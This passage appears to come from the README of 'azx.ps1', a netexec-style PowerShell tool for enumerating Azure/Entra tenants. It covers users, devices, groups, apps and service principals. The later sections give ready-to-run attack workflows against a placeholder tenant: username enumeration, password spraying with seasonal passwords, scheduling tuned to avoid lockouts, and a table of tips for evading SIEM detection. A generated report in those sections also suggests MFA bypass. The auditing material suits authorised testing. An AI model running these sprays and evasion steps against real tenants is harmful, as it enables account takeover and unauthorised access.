| `Username` | Single username to check (users/guest/sessions commands) | No | - |
| `Password` | Password to test for authentication (guest command). Use `''` for null password | No | - |
| `UserFile` | File with usernames to check (users/guest commands) | No | - |
| `CommonUsernames` | Use built-in common username list (users command) | No | `False` |
| `Hours` | Number of hours to look back for sign-in events (sessions command). Azure AD retention: 7 days (Free), 30 days (Premium) | No | `24` |
| `NoColor` | Disable colored output | No | `False` |
| `ExportPath` | Export results to CSV, JSON, or HTML (netexec-styled reports) | No | - |
| `Scopes` | Microsoft Graph scopes to request (automatically set based on command) | No | Command-specific |
| `IncludeWritePermissions` | Include AppRoleAssignment.ReadWrite.All permission for sp-discovery command (script only reads, typically unnecessary) | No | `False` |
| `Disconnect` | Automatically disconnect from Microsoft Graph after script execution (useful for security and cleanup) | No | `False` |

### Available Filters

- `all` - All devices (default)
- `windows` - Only Windows devices
- `azuread` - Only Azure AD joined devices
- `hybrid` - Only Hybrid Azure AD joined devices
- `compliant` - Only compliant devices
- `noncompliant` - Only non-compliant devices
- `disabled` - Only disabled devices

## 💡 Usage Examples

### Getting Help

### Display Available Commands
Show all available commands with authentication requirements:
```powershell
.\azx.ps1 help
```

This displays:
- All available commands
- Authentication requirements (Required, Not Required, Hybrid)
- Brief descriptions
- Common usage examples
- Link to full documentation

### Auto-Disconnect Feature

The `-Disconnect` parameter automatically disconnects from Microsoft Graph after command execution. This is useful for:
- **Security**: Ensures no lingering authentication sessions
- **Cleanup**: Automatic session management
- **Compliance**: Quick disconnect after data collection

### Example: Enumerate and Disconnect
```powershell
# Enumerate hosts and automatically disconnect when done
.\azx.ps1 hosts -Disconnect

# Discover service principals, export data, then disconnect
.\azx.ps1 sp-discovery -ExportPath sp-data.json -Disconnect

# Works with any authenticated command
.\azx.ps1 groups -ExportPath groups.csv -Disconnect
.\azx.ps1 roles -Disconnect
```

### Example: Multiple Commands with Final Disconnect
```powershell
# Run multiple enumerations, only disconnect after the last one
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 sp-discovery -ExportPath sp.json -Disconnect
```

---

### Username Enumeration Examples

### Example 1: Check Single Username (Auto-Detect Domain)
Check if a username exists using auto-detected domain:
```powershell
.\azx.ps1 users -Username alice@example.com
```

### Example 2: Check Single Username
Check if a specific username exists in the tenant:
```powershell
.\azx.ps1 users -Domain example.com -Username alice@example.com
```

### Example 3: Check Username Without Domain Suffix
Check a username (domain will be auto-appended):
```powershell
.\azx.ps1 users -Domain example.com -Username alice
```

### Example 4: Check Usernames from File
Check multiple usernames from a file (one per line):
```powershell
.\azx.ps1 users -Domain example.com -UserFile users.txt
```

### Example 5: Check Common Usernames
Test common usernames against the tenant:
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames
```

### Example 6: Check Common Usernames (Auto-Detect Domain)
Test common usernames against your current tenant (domain auto-detected):
```powershell
.\azx.ps1 users -CommonUsernames
```

### Example 7: Export Valid Usernames
Check common usernames and export valid ones:
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath valid-users.csv
```

### Example 8: Multiple Methods Combined
Check a specific user plus common usernames:
```powershell
.\azx.ps1 users -Domain example.com -Username admin@example.com -CommonUsernames -ExportPath results.json
```

### User Profile Enumeration Examples

### Example 8a: Basic User Profile Enumeration
Enumerate all user profiles in the Azure/Entra tenant (authenticated):
```powershell
.\azx.ps1 user-profiles
```

### Example 8b: User Profile Enumeration with CSV Export
Enumerate all user profiles and export to CSV:
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
```

### Example 8c: User Profile Enumeration with JSON Export
Enumerate all user profiles and export to JSON with full details:
```powershell
.\azx.ps1 user-profiles -ExportPath users.json
```

### Example 8d: User Profile Enumeration as Guest User
Test what user profiles a guest user can enumerate:
```powershell
# Connect as guest user first
.\azx.ps1 user-profiles -ExportPath guest-users.json
```

### Example 8e: Complete Directory Enumeration
Enumerate users, groups, devices, and policies:
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Tenant Discovery Examples

### Example 9: Auto-Detect Current User's Domain
Discover tenant configuration for your current domain (auto-detected):
```powershell
.\azx.ps1 tenant
```

### Example 10: Basic Tenant Discovery
Discover tenant configuration for a specific domain:
```powershell
.\azx.ps1 tenant -Domain example.com
```

### Example 11: Tenant Discovery with Export
Discover tenant configuration and export to JSON:
```powershell
.\azx.ps1 tenant -Domain contoso.onmicrosoft.com -ExportPath tenant-info.json
```

### Example 12: Tenant Discovery for Multiple Domains
Discover configuration for multiple domains:
```powershell
@("example.com", "contoso.com", "fabrikam.onmicrosoft.com") | ForEach-Object { 
    .\azx.ps1 tenant -Domain $_ 
}
```

### Example 12a: Enhanced Tenant Enumeration (like `nxc smb --enum`)
Perform comprehensive tenant reconnaissance including exposed apps and misconfigurations:
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant-security-findings.json
```
This will enumerate:
- Exposed application IDs and client configurations
- Publicly accessible redirect URIs
- OAuth/OIDC misconfigurations (implicit flow, risky grant types)
- Federation metadata and endpoints
- Accessible Graph and Azure Management endpoints

### Device Enumeration Examples

### Example 13: Basic Device Enumeration
Enumerate all devices in the Azure/Entra tenant:
```powershell
.\azx.ps1 hosts
```

### Example 14: Filter Windows Devices
Enumerate only Windows devices:
```powershell
.\azx.ps1 hosts -Filter windows
```

### Example 15: Azure AD Joined Devices with Owners
Enumerate Azure AD joined devices and display their registered owners:
```powershell
.\azx.ps1 hosts -Filter azuread -ShowOwners
```

### Example 16: Non-Compliant Devices with Export
Enumerate non-compliant devices and export results to CSV:
```powershell
.\azx.ps1 hosts -Filter noncompliant -ExportPath devices.csv
```

### Example 17: Export to JSON
Enumerate all devices and export to JSON format:
```powershell
.\azx.ps1 hosts -ExportPath results.json
```

### Example 18: Disable Colored Output
Enumerate devices without colored output (useful for logging):
```powershell
.\azx.ps1 hosts -NoColor
```

### Example 19: Hybrid Joined Devices Only
Enumerate only Hybrid Azure AD joined devices:
```powershell
.\azx.ps1 hosts -Filter hybrid
```

### Example 20: Disabled Devices
Find all disabled devices in the tenant:
```powershell
.\azx.ps1 hosts -Filter disabled
```

### Example 21: Compliant Windows Devices with Export
Enumerate compliant Windows devices and export:
```powershell
.\azx.ps1 hosts -Filter compliant | Where-Object { $_.OperatingSystem -like "Windows*" }
```
*Note: For complex filtering, combine with PowerShell pipeline*

### Example 22: Custom Scopes
Specify custom Microsoft Graph scopes:
```powershell
.\azx.ps1 hosts -Scopes "Device.Read.All,Directory.Read.All"
```

### Guest User Enumeration Examples (Azure Null Session)

### Example 23: Test for Guest Enumeration Vulnerability
First, check if the target organization has external collaboration enabled:
```powershell
# Reconnaissance (no authentication)
.\azx.ps1 tenant -Domain targetcorp.com
```

### Example 24: Enumerate as Guest User (Low-Noise Reconnaissance)
Using compromised or legitimate guest credentials:
```powershell
# Disconnect any existing sessions
Disconnect-MgGraph

# Connect with guest credentials
.\azx.ps1 hosts
# (Enter guest credentials when prompted: vendor@partner.com)
```

### Example 25: Full Guest Enumeration with Export
Perform comprehensive enumeration as a guest user:
```powershell
# Full device enumeration with owners
.\azx.ps1 hosts -ShowOwners -ExportPath guest-devices.json

# Export to analyze offline
# Low-noise reconnaissance - guest activity is rarely monitored
```

### Example 26: Guest User Capability Testing
Test what a guest account can access:
```powershell
# After connecting as guest with .\azx.ps1 hosts

# Try built-in commands (easier and netexec-style output)
.\azx.ps1 groups -ExportPath guest-groups.csv
.\azx.ps1 pass-pol -ExportPath guest-policy.json

# Or use PowerShell Graph API directly
Get-MgUser -All | Select DisplayName, UserPrincipalName, JobTitle, Department | Export-Csv guest-users.csv
Get-MgGroup -All | Select DisplayName, Description | Export-Csv guest-groups.csv
Get-MgApplication -All | Select DisplayName, AppId | Export-Csv guest-apps.csv
```

### Example 27: Compare Guest vs Member Permissions
Enumerate with both account types to identify permission differences:
```powershell
# As guest user
.\azx.ps1 hosts -ExportPath guest-enum.json

# Disconnect and connect as member user
Disconnect-MgGraph
.\azx.ps1 hosts -ExportPath member-enum.json

# Compare results to understand guest restrictions (if any)
```

### Example 28: Automated Guest Vulnerability Scanner
Perform comprehensive guest permission security assessment:
```powershell
# Basic scan (auto-detect domain)
.\azx.ps1 guest-vuln-scan

# Scan specific tenant
.\azx.ps1 guest-vuln-scan -Domain targetcorp.com

# Full scan with detailed JSON report
.\azx.ps1 guest-vuln-scan -ExportPath guest-security-assessment.json

# The scanner performs:
# Phase 1: Unauthenticated checks
#   - External collaboration enabled?
#   - Tenant configuration
#   - Federation status
#
# Phase 2: Authenticated checks (requires login)
#   - Guest permission policy level
#   - External collaboration settings
#   - Test actual guest access to:
#     * Users directory
#     * Groups
#     * Devices
#     * Applications
#     * Directory Roles
#
# Phase 3: Security assessment report
#   - Risk score (0-100)
#   - Risk rating (LOW/MEDIUM/HIGH/CRITICAL)
#   - Detailed vulnerabilities with recommendations
#   - Actionable remediation steps
#
# 🔴 Risk-based color coding in vulnerability output:
# - CRITICAL risk (Score ≥ 70) = Guests have same permissions as members
# - HIGH risk (Score ≥ 40) = Guests can enumerate directory resources
# - 🟡 MEDIUM risk (Score 20-39) = Partial guest access enabled
```

**Example Output:**
```
[*] AZX - Guest User Vulnerability Scanner
[*] Command: Guest-Vuln-Scan (Azure Null Session Security Assessment)

[*] PHASE 1: Unauthenticated Enumeration
AZR         targetcorp.com                     443    [+] Tenant exists
AZR         targetcorp.com                     443    [!] External collaboration: ENABLED

[*] PHASE 2: Authenticated Enumeration (Guest Permission Testing)
[+] Connected as: vendor@partner.com
[!] GUEST USER DETECTED - Testing guest permission boundaries

[*] Checking guest permission policy...
    [!] WARNING: Guest permissions are not fully restricted

[*] Testing guest access to directory resources...
    [+] Users : ACCESSIBLE (Found 10 items)
    [+] Groups : ACCESSIBLE (Found 10 items)
    [+] Devices : ACCESSIBLE (Found 10 items)
    [-] Applications : BLOCKED
    [-] DirectoryRoles : BLOCKED

[*] PHASE 3: Security Assessment Report
[*] Overall Risk Score: 65 / 100
[*] Risk Rating: HIGH
[*] Vulnerabilities Found: 5

    [HIGH] GuestEnumeration
    Description: Guest user can enumerate Users - Azure Null Session equivalent
    Recommendation: Review and restrict guest access to Users
```

### Group Enumeration Examples

### Example 29a: Basic Group Enumeration (mimics `nxc smb --groups`)
Enumerate all groups in the Azure/Entra tenant:
```powershell
.\azx.ps1 groups

# 🔴 Privileged/administrative security groups are automatically highlighted in RED
# Look for groups containing: admin, administrator, privileged, global, etc.
# 🟢 Standard security groups appear in GREEN
# 🟡 Mail-enabled groups appear in YELLOW
```

### Example 29b: Group Enumeration with Export
Enumerate all groups and export to CSV:
```powershell
.\azx.ps1 groups -ExportPath groups.csv
```

### Example 29c: Group Enumeration with Member Counts
Enumerate groups and display member counts (slower):
```powershell
.\azx.ps1 groups -ShowOwners
```

### Example 29d: Group Enumeration as Guest User
Test what groups a guest user can enumerate:
```powershell
# Connect as guest user
.\azx.ps1 groups -ExportPath guest-groups.json
```

### Local Groups Enumeration Examples (Administrative Units)

### Example 30a: Basic Local Groups Enumeration (mimics `nxc smb --local-group`)
Enumerate all Administrative Units in the Azure/Entra tenant:
```powershell
.\azx.ps1 local-groups

# 🔴 Privileged Administrative Units are automatically highlighted in RED
# Look for AUs containing: admin, security, privileged, IT, executive, etc.
# 🟡 Dynamic membership AUs appear in YELLOW (automated assignment)
# 🟢 Active AUs with members/roles appear in GREEN
# 🔵 Standard AUs appear in CYAN
```

### Example 30b: Local Groups with Member Counts
Enumerate Administrative Units with member and scoped role counts:
```powershell
.\azx.ps1 local-groups -ShowOwners
```

### Example 30c: Export Local Groups to CSV
Export Administrative Units enumeration to CSV:
```powershell
.\azx.ps1 local-groups -ExportPath admin-units.csv
```

### Example 30d: Export to JSON with Full Details
Export with complete Administrative Units information:
```powershell
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units.json
```

### Example 30e: HTML Report for Administrative Units
Generate comprehensive HTML report:
```powershell
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units.html
```

### Example 30f: Administrative Structure Mapping
Map complete administrative delegation structure:
```powershell
# Step 1: Enumerate Administrative Units (scoped boundaries)
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units.csv

# Step 2: Enumerate role assignments (privilege levels)
.\azx.ps1 roles -ExportPath roles.csv

# Step 3: Cross-reference to understand delegation structure
```

### Password Policy Enumeration Examples

### Example 28e: Password Policy Enumeration (mimics `nxc smb --pass-pol`)
Display password policies and security settings:
```powershell
.\azx.ps1 pass-pol
```

### Example 28f: Password Policy with Export
Export password policy information to JSON:
```powershell
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Example 28g: Complete Security Assessment
Enumerate all security-relevant information:
```powershell
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Application Enumeration Examples

### Example 30a: Basic Application Enumeration
Enumerate all registered applications and service principals:
```powershell
.\azx.ps1 apps
```

This command displays:
- **Phase 1**: Application registrations with credential status
- **Phase 2**: Service principals (SPNs) with authentication details
- Summary statistics including security warnings
- **🔴 Red highlighting**: Applications requesting high-risk Microsoft Graph permissions are automatically highlighted in red
- **🟡 Yellow highlighting**: Password-only credentials and ROPC-enabled apps are highlighted in yellow

### Example 30b: Application Enumeration with CSV Export
Enumerate applications and export to CSV for offline analysis:
```powershell
.\azx.ps1 apps -ExportPath apps.csv
```

### Example 30c: Application Enumeration with JSON Export (Recommended)
Export full application and service principal details to JSON:
```powershell
.\azx.ps1 apps -ExportPath apps.json
```

The JSON export includes:
- Application IDs, display names, and object IDs
- Credential counts (password vs certificate)
- Public client configuration status (ROPC vulnerability indicator)
- Sign-in audience settings
- Redirect URIs (web and public client)
- Service principal types and enabled status

### Example 30d: Identify Security Risks
Look for applications with weak authentication:
```powershell
.\azx.ps1 apps -ExportPath apps.csv

# High-risk applications are automatically highlighted during output:
# - 🔴 RED apps = Requesting high-risk permissions (Directory.ReadWrite.All, Application.ReadWrite.All, etc.)
# - 🟡 YELLOW apps = Password-only credentials OR ROPC-enabled (password spray vulnerable)
# - 🟢 GREEN apps = Certificate-based authentication (secure configuration)

# Then analyze the CSV for detailed security analysis:
# - Apps/SPNs with PasswordCredentials > 0 and KeyCredentials = 0 (password-only = vulnerable)
# - Apps with IsFallbackPublicClient = True (ROPC-enabled = password spray vulnerable)
# - Service principals with AccountEnabled = True and password-only credentials
```

**Security Warning**: Applications and service principals with password-only credentials are vulnerable to credential theft, similar to SMB hosts without signing. Applications requesting high-risk permissions like `Directory.ReadWrite.All`, `Application.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, or `RoleManagement.ReadWrite.Directory` pose privilege escalation risks. These are **automatically color-coded** during enumeration and summarized at the end.

### Example 30e: Complete Tenant Application Assessment
Full application security audit workflow:
```powershell
# 1. Enumerate all applications and service principals
.\azx.ps1 apps -ExportPath apps-full.json

# 2. Check for vulnerable configurations (from vuln-list command)
.\azx.ps1 vuln-list -ExportPath vuln-report.json

# 3. Analyze results
$apps = Get-Content apps-full.json | ConvertFrom-Json
$passwordOnly = $apps | Where-Object { $_.PasswordCredentials -gt 0 -and $_.KeyCredentials -eq 0 }
$publicClients = $apps | Where-Object { $_.IsFallbackPublicClient -eq $true }

Write-Host "Password-only applications: $($passwordOnly.Count)"
Write-Host "Public client applications (ROPC-enabled): $($publicClients.Count)"
```

### Service Principal Discovery Examples

### Example 31a: Basic Service Principal Discovery
Discover all service principals with their permissions and ownership:
```powershell
.\azx.ps1 sp-discovery
```

This command displays:
- **Phase 1**: Service principal enumeration with credential information
- **Phase 2**: App role assignments (application permissions) for each SPN
- **Phase 3**: OAuth2 permission grants (delegated permissions) for each SPN
- **Phase 4**: Service principal owners
- Detailed permission breakdown for each service principal
- Summary statistics including security warnings
- **🔴 Red highlighting**: Service principals and permissions with high-risk capabilities are automatically highlighted in red for immediate visibility

### Example 31b: Service Principal Discovery with CSV Export
Discover service principals and export to CSV for offline analysis:
```powershell
.\azx.ps1 sp-discovery -ExportPath sp-permissions.csv
```

The CSV export includes:
- Service principal IDs, app IDs, and display names
- Account status and service principal type
- Credential counts (password vs certificate)
- App role assignment count and details
- OAuth2 permission grant count and details
- Owner count and owner names

### Example 31c: Service Principal Discovery with JSON Export (Recommended)
Export full service principal permission details to JSON:
```powershell
.\azx.ps1 sp-discovery -ExportPath sp-permissions.json
```

The JSON export includes comprehensive data:
- All basic service principal properties
- Full app role assignments with resource mappings
- Complete OAuth2 permission grants with scope details
- Owner information (display names and types)
- Security risk indicators

### Example 31d: Identify High-Risk Service Principals
Look for service principals with dangerous permissions:
```powershell
.\azx.ps1 sp-discovery -ExportPath sp-perms.csv

# High-risk service principals are automatically highlighted in RED during output
# Look for:
# - 🔴 RED service principals = Have high-risk permissions (RoleManagement, Application.ReadWrite, etc.)
# - 🟡 YELLOW service principals = Password-only credentials (vulnerable to credential theft)
# - 🟢 GREEN service principals = Standard permissions with certificate-based auth

# Then analyze the CSV for detailed security analysis:
# - SPNs with PasswordCredentials > 0 and KeyCredentials = 0 (password-only = vulnerable)
# - SPNs with high AppRoleCount (many permissions = potential privilege escalation)
# - SPNs with OAuth2Permissions containing "RoleManagement" or "Application.ReadWrite"
# - SPNs with OwnerCount = 0 (orphaned service principals)
```

**Security Warning**: Service principals with password-only credentials are vulnerable to credential theft. Service principals with high-risk permissions like `RoleManagement.ReadWrite.Directory`, `Application.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, or `Directory.ReadWrite.All` can be used for privilege escalation. These are **automatically highlighted in RED** during enumeration and summarized at the end.

### Example 31e: Complete Service Principal Permission Audit
Full service principal security audit workflow:
```powershell
# 1. Discover all service principals with permissions
.\azx.ps1 sp-discovery -ExportPath sp-full.json

# 2. Analyze results for security risks
$spns = Get-Content sp-full.json | ConvertFrom-Json
$passwordOnly = $spns | Where-Object { $_.PasswordCredentials -gt 0 -and $_.KeyCredentials -eq 0 }
$highPermissions = $spns | Where-Object { $_.AppRoleCount -gt 5 -or $_.OAuth2PermissionCount -gt 5 }
$orphaned = $spns | Where-Object { $_.OwnerCount -eq 0 }

Write-Host "Password-only service principals: $($passwordOnly.Count)"
Write-Host "Service principals with high permissions: $($highPermissions.Count)"
Write-Host "Orphaned service principals (no owners): $($orphaned.Count)"

# 3. Identify privilege escalation paths
$dangerousPerms = $spns | Where-Object { 
    $_.OAuth2Permissions -match "RoleManagement|Application.ReadWrite|Directory.ReadWrite" 
}
Write-Host "Service principals with dangerous permissions: $($dangerousPerms.Count)"
$dangerousPerms | Select-Object DisplayName, AppId, OAuth2Permissions | Format-Table
```

### Example 31f: Track Service Principal Ownership
Identify who owns which service principals:
```powershell
.\azx.ps1 sp-discovery -ExportPath sp-owners.json

# Analyze ownership patterns
$spns = Get-Content sp-owners.json | ConvertFrom-Json
$withOwners = $spns | Where-Object { $_.OwnerCount -gt 0 }
$multiOwner = $spns | Where-Object { $_.OwnerCount -gt 1 }

Write-Host "Service principals with owners: $($withOwners.Count)"
Write-Host "Service principals with multiple owners: $($multiOwner.Count)"

# Group by owner
$spns | Where-Object { $_.Owners } | 
    ForEach-Object { $_.Owners -split '; ' } | 
    Group-Object | 
    Sort-Object Count -Descending | 
    Select-Object Name, Count | 
    Format-Table
```

### Guest Login Enumeration Examples (like nxc smb -u 'a' -p '')

### Example 28h: Check Tenant Guest Configuration (Unauthenticated)
Check if a tenant accepts external/guest authentication:
```powershell
.\azx.ps1 guest -Domain targetcorp.com
```

### Example 28h2: Check Guest Configuration (Auto-Detect Domain)
Check guest configuration for your current tenant (domain auto-detected):
```powershell
.\azx.ps1 guest
```

### Example 28i: Test Null/Empty Password (like nxc smb -u 'a' -p '')
Test if accounts accept empty passwords:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -Username admin -Password ''
.\azx.ps1 guest -Domain targetcorp.com -Username admin@targetcorp.com -Password ''
```

### Example 28j: Test Specific Credentials
Test a specific username/password combination:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -Username alice@targetcorp.com -Password 'Summer2024!'
```

### Example 28k: Password Spray (Single Password, Multiple Users)
Test one password against multiple usernames:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile users.txt -Password 'Winter2024!'
```

### Example 28l: Credential Testing from File
Test credentials from a file (format: `username:password` per line):
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile creds.txt
```

File format example (creds.txt):
```
admin:Password123
alice:Summer2024!
bob@targetcorp.com:Winter2024!
```

### Example 28m: Export Guest Login Results
Test credentials and export results:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile users.txt -Password 'Password123' -ExportPath spray-results.json
```

### Password Spray Attack Examples (GetCredentialType + ROPC)

The most effective password spray attacks combine **username enumeration** with **credential testing** in a two-phase approach:

### Example 28n: Complete Password Spray - Common Usernames
Full workflow using common administrator accounts:
```powershell
# Phase 1: Enumerate valid usernames (GetCredentialType - no authentication logs)
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv

# Phase 2: Extract valid usernames
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File -FilePath spray-targets.txt
Write-Host "Found $($validUsers.Count) valid usernames for spraying"

# Phase 3: Password spray with seasonal password
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json

# Phase 4: Analyze results
$results = Get-Content spray-results.json | ConvertFrom-Json
$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$mfaAccounts = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }

Write-Host "`nValid Credentials Found: $($validCreds.Count)"
Write-Host "Accounts with MFA: $($mfaAccounts.Count)"
$validCreds | Format-Table Username, MFARequired, HasToken
```

### Example 28o: Targeted Password Spray - Custom Username List
Using a custom list of identified users:
```powershell
# Assume you've collected usernames from OSINT, LinkedIn, company website, etc.
# Create a file: executives.txt with usernames (one per line)

# Phase 1: Validate which usernames actually exist
.\azx.ps1 users -Domain targetcorp.com -UserFile executives.txt -ExportPath validated-execs.csv

# Phase 2: Spray only against valid accounts
$validExecs = Import-Csv validated-execs.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validExecs | Out-File -FilePath valid-executives.txt

# Phase 3: Test with company-specific password pattern
.\azx.ps1 guest -Domain targetcorp.com -UserFile valid-executives.txt -Password 'TargetCorp2024!' -ExportPath exec-spray.json
```

### Example 28p: Multi-Password Spray Campaign
Testing multiple passwords sequentially (with delays to avoid lockouts):
```powershell
# Validate usernames first
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Password list (seasonal passwords + common patterns)
$passwords = @(
    'Summer2024!',
    'Winter2024!',
    'Spring2024!',
    'Fall2024!',
    'Password123!',
    'Welcome123!',
    'TargetCorp2024!'
)

# Spray each password with 30-minute delay between rounds
foreach ($password in $passwords) {
    Write-Host "`n[*] Testing password: $password"
    .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
    
    # Wait 30 minutes before next password (avoid account lockouts)
    if ($password -ne $passwords[-1]) {
        Write-Host "[*] Waiting 30 minutes before next password spray..."
        Start-Sleep -Seconds 1800  # 30 minutes
    }
}

# Consolidate all results
$allResults = @()
foreach ($password in $passwords) {
    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
    $allResults += $validCreds
}

Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
$allResults | Format-Table Username, Password, MFARequired, HasToken
```

### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
Intelligent spraying that respects common lockout policies:
```powershell
# Most organizations lock accounts after 5-10 failed attempts
# Spray only 1 password per day to stay under threshold

# Day 1: Validate usernames
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Day 1: Test most common password
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-day1.json

# Day 2: Test second most common (24 hours later)
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Winter2024!' -ExportPath spray-day2.json

# Day 3: Test company-specific pattern
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'TargetCorp2024!' -ExportPath spray-day3.json

# Analyze results after campaign
$day1 = Get-Content spray-day1.json | ConvertFrom-Json
$day2 = Get-Content spray-day2.json | ConvertFrom-Json
$day3 = Get-Content spray-day3.json | ConvertFrom-Json

$allValidCreds = @()
$allValidCreds += $day1.AuthResults | Where-Object { $_.Success }
$allValidCreds += $day2.AuthResults | Where-Object { $_.Success }
$allValidCreds += $day3.AuthResults | Where-Object { $_.Success }

Write-Host "[+] Campaign complete - Valid credentials: $($allValidCreds.Count)"
$allValidCreds | Export-Csv campaign-results.csv -NoTypeInformation
```

### Example 28r: Password Spray with Username:Password Format
Testing specific username/password combinations:
```powershell
# Create a file (creds.txt) with format: username:password
# admin:Password123
# alice:Summer2024!
# bob@targetcorp.com:Welcome2024!

# Test all credentials at once
.\azx.ps1 guest -Domain targetcorp.com -UserFile creds.txt -ExportPath cred-test-results.json

# Analyze what worked
$results = Get-Content cred-test-results.json | ConvertFrom-Json
$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$mfaRequired = $validCreds | Where-Object { $_.MFARequired -eq $true }
$fullAccess = $validCreds | Where-Object { $_.HasToken -eq $true }

Write-Host "`nValid Credentials: $($validCreds.Count)"
Write-Host "Full Access (no MFA): $($fullAccess.Count)"
Write-Host "MFA Required: $($mfaRequired.Count)"
```

### Example 28s: Automated Password Spray Analysis
Complete workflow with result analysis and reporting:
```powershell
# Comprehensive password spray with analysis
$domain = "targetcorp.com"
$password = "Summer2024!"

# Step 1: Username enumeration
Write-Host "[*] Phase 1: Enumerating valid usernames..."
.\azx.ps1 users -Domain $domain -CommonUsernames -ExportPath users-enum.csv

# Step 2: Extract valid usernames
$validUsers = Import-Csv users-enum.csv | Where-Object { $_.Exists -eq 'True' }
Write-Host "[+] Found $($validUsers.Count) valid usernames"
$validUsers.Username | Out-File spray-targets.txt

# Step 3: Password spray
Write-Host "[*] Phase 2: Password spraying..."
.\azx.ps1 guest -Domain $domain -UserFile spray-targets.txt -Password $password -ExportPath spray-results.json

# Step 4: Analyze results
$results = Get-Content spray-results.json | ConvertFrom-Json

$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$invalidCreds = $results.AuthResults | Where-Object { $_.Success -eq $false }
$mfaRequired = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }
$lockedAccounts = $results.AuthResults | Where-Object { $_.ErrorCode -eq 'ACCOUNT_LOCKED' }

# Step 5: Generate report
$report = @"

=================================================
   PASSWORD SPRAY ATTACK REPORT
=================================================
Target Domain:        $domain
Test Password:        $password
Date:                 $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

RESULTS SUMMARY
-------------------------------------------------
Total Usernames Tested:     $($results.AuthResults.Count)
Valid Credentials Found:    $($validCreds.Count)
  - Full Access (no MFA):   $($validCreds.Count - $mfaRequired.Count)
  - MFA Required:           $($mfaRequired.Count)
Invalid Credentials:        $($invalidCreds.Count)
Locked Accounts:            $($lockedAccounts.Count)

VALID CREDENTIALS
-------------------------------------------------
$($validCreds | ForEach-Object { "  [+] $($_.Username) - MFA: $($_.MFARequired)" } | Out-String)

RECOMMENDATIONS
-------------------------------------------------
"@

if ($validCreds.Count -gt 0) {
    $report += "  [!] CRITICAL: Valid credentials found!`n"
    $report += "  [*] Next steps:`n"
    $report += "      1. Test accounts without MFA for full access`n"
    $report += "      2. Attempt MFA bypass techniques for MFA-protected accounts`n"
    $report += "      3. Use valid credentials for further enumeration`n"
}

if ($lockedAccounts.Count -gt 0) {
    $report += "`n  [!] WARNING: $($lockedAccounts.Count) accounts locked during spray`n"
    $report += "  [*] Consider longer delays between attempts`n"
}

$report += "`n=================================================`n"

Write-Host $report
$report | Out-File "spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"

Write-Host "`n[+] Report saved to: spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
```

**Why This Two-Phase Approach is Effective:**

1. **Stealth**: GetCredentialType doesn't trigger authentication logs (Phase 1)
2. **Efficiency**: Only spray against validated usernames (avoid wasted attempts)
3. **Safety**: Reduces account lockout risk by testing fewer invalid usernames
4. **Intelligence**: Separate enumeration from credential testing for better OPSEC
5. **Speed**: Validate 100s of usernames quickly, then spray only valid targets

**Detection Considerations:**

| Activity | Detection Risk | SIEM Alert Likelihood | Mitigation |
|----------|----------------|----------------------|------------|
| GetCredentialType enumeration | 🟢 Low | Low - No auth logs generated | Use residential IP, rate-limit requests |
| ROPC password spray | 🟡 Medium | Medium - Failed auth logs | Slow spray (1 password/day), respect lockout thresholds |
| Multiple password spray rounds | 🔴 High | High - Pattern detection | Long delays between passwords (24+ hours) |
| Account lockouts | 🔴 Critical | Critical - Immediate SOC alert | Test minimal passwords, monitor for lockouts |

### Active Session Enumeration Examples (like nxc smb --qwinsta)

### Example 29-sessions-a: Enumerate All Active Sessions
Query sign-in logs for all users in the last 24 hours:
```powershell
